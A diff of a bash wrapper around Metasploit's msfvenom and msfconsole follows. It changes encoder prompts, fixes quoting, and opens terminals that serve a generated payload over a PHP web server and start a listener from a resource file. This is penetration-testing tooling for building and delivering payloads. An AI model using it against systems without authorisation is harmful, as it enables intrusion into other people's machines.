@@ -62,21 +62,21 @@ fi
 
 function setenc {
 # Set Encoder & iterations options
-echo Set Encoder. Accepted Encoders:
-msfvenom --list encoders
-#cat enc.txt
-read -p "Enter Encoder type [none]: " encoder
-if [ -z "$encoder" ] || [ "$encoder" = 'none' ]
+read -p "Use msfvenom encoder? [no]: " enc1
+if [ -z "$enc1" ] || [ "$enc1" = 'no' ]
 	then
-	encoder=''
-	iterations=''
+	return
 else
+	echo Accepted Encoders:
+	msfvenom --list encoders
+	read -p "Enter Encoder type: " encoder
 	read -p "Enter Encode Iterations ["1"]: " iterations
 	if [ -z "$iterations" ]
 	then
-	iterations='1'
+		iterations='1'
 	fi
 fi
+
 if [ -z "$encoder" ] && [ -z "$iterations"]
 	then
 	encopt=''
@@ -137,7 +137,7 @@ function genresfile {
 read -p "Set resource filename [$filename]: " resfilename
 if [ -z "$resfilename" ] || [ "$resfilename" = "$filename" ]
 	then
-	resfilename='$filename'
+	resfilename="$filename"
 fi
 ## Generate resource file
 echo Generating..
@@ -187,7 +187,8 @@ if [ -z "$hsvr" ] || [ "$hsvr" = 'no' ] || [ "$hsvr" = 'n' ]
 else
 	if [ "$hsvr" = 'yes' ] || [ "$hsvr" = 'y' ]
 		then
-		nohup php -S 0.0.0.0:80 -t "$location" 2>&1 &
+		gnome-terminal -x php -S 0.0.0.0:80 -t "$location"
+		echo
 		echo PHP Server has started. Download the file at "http://$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')/$filename.$format"
 	fi
 fi
@@ -203,11 +204,13 @@ if [ -z "$runrc" ] || [ "$runrc" = 'no' ] || [ "$runrc" = 'n' ]
 else
 	if [ "$runrc" = 'yes' ] || [ "$runrc" = 'y' ]
 		then
-		echo Loading "$location/$resfilename.rc"..
-		msfconsole -r "$location/$resfilename.rc"
+		echo Running "$location/$resfilename.rc"
+		echo
+		gnome-terminal -x msfconsole -r "$location/$resfilename.rc"
 	fi
 fi
 }
+
 
 #run functions
 setpayload
@@ -222,3 +225,7 @@ genbinfile
 encb64
 hostsvr
 runmsfrc
+
+echo
+echo
+echo Script has reached EOF. Exiting.
